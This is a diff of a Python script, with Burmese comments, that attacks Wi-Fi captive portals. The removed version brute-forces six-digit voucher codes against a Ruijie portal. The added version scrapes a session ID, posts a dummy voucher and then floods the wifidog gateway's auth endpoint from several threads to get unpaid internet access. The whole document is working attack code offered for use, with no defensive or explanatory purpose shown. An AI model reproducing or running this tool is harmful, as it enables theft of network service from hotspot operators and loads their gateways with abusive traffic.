@@ -1,69 +1,87 @@
-import time
-import random
-import os
-import sys
 import requests
-from datetime import datetime
+import re
+import urllib3
+import time
+import threading
+from urllib.parse import urlparse, parse_qs, urljoin
 
-# အရောင်များ
-RED = '\033[91m'
-GREEN = '\033[92m'
-WHITE = '\033[97m'
-CYAN = '\033[96m'
-END = '\033[0m'
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Portal Address
-url = "https://portal-as.ruijienetworks.com"
+# --- SETTINGS ---
+PING_THREADS = 5
+PING_INTERVAL = 0.1 
 
-def start_bruteforce():
-    os.system('clear')
-    print(f"{CYAN}[+] Checking Bypass...{END}")
-    time.sleep(0.2)
-    print(f"{CYAN}[+] Done.{END}")
-    time.sleep(0.2)
-    print(f"{CYAN}[+] 1-Trying to connect server...{END}")
-    time.sleep(0.3)
-    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}\n")
+def check_real_internet():
+    try:
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
+    except: return False
+
+def high_speed_ping(auth_link, session, sid):
+    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
+    while True:
+        try:
+            res = session.get(auth_link, timeout=5)
+            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
+        except: break
+        time.sleep(PING_INTERVAL)
+
+def start_process():
+    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
 
     while True:
-        code = str(random.randint(0, 999999)).zfill(6)
-        params = {'voucher': code, 'method': 'login'}
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
 
         try:
-            # Timeout ကို 0.3s အထိလျှော့ချပြီး အမြန်နှုန်းမြှင့်တင်ထားသည်
-            res = requests.get(url, params=params, timeout=0.3)
-            
-            if res.status_code == 200 and "success" in res.text.lower():
-                print(f"{GREEN}Success Code: {code}{END}")
-                with open("success.txt", "a") as f:
-                    f.write(f"Voucher: {code} | {datetime.now().strftime('%H:%M:%S')}\n")
-                break
-            else:
-                # အနီရောင် Fail Code သီးသန့်
-                print(f"{RED}Fail Code: {code}{END}")
-                
-        except:
-            # Server Timeout ဖြစ်လျှင်လည်း အနီရောင်ဖြင့် ချက်ချင်းပြရန်
-            print(f"{RED}Fail Code: {code}{END}")
-        
-        # Sleep ကို လုံးဝဖြုတ်လိုက်ခြင်းဖြင့် အမြင့်ဆုံးမြန်နှုန်း ရရှိစေသည်
-        # (စက်အရမ်းပူလာလျှင် time.sleep(0.01) ဟု ပြန်ထည့်နိုင်သည်)
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
+                    time.sleep(5)
+                    continue
+
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+
+            # ၁။ SID ရှာဖွေခြင်း
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+
+            if sid:
+                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
+                print(f"\n[*] Activating Session with Voucher API...")
+                voucher_api = f"{portal_host}/api/auth/voucher/"
+                try:
+                    # accessCode နေရာတွင် 123456 အပြင် လိုအပ်ပါက ပြောင်းလဲနိုင်သည်
+                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                    print(f"[+] Voucher API Response: {v_res.status_code}")
+                except:
+                    print("[!] Voucher API Failed (Gateway might not require it)")
+
+                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
+                params = parse_qs(parsed_portal.query)
+                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+                gw_port = params.get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+
+                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")
+
+                for _ in range(PING_THREADS):
+                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
+
+                while check_real_internet():
+                    time.sleep(5)
+
+        except Exception as e:
+            time.sleep(5)
 
 if __name__ == "__main__":
-    os.system('clear')
-    print(f"{WHITE}[1] Get Internet Access\n[2] Bruteforce Access Voucher Code\n[3] Recheck Success Code{END}\n")
-    
-    try:
-        option = input(f"{WHITE}Enter an Option: {END}")
-        if option == '2':
-            start_bruteforce()
-        elif option == '3':
-            if os.path.exists("success.txt"):
-                with open("success.txt", "r") as f:
-                    print(f"\n{GREEN}{f.read()}{END}")
-            else:
-                print(f"\n{RED}No codes saved yet.{END}")
-        else:
-            sys.exit()
-    except EOFError:
-        sys.exit()
+    start_process()
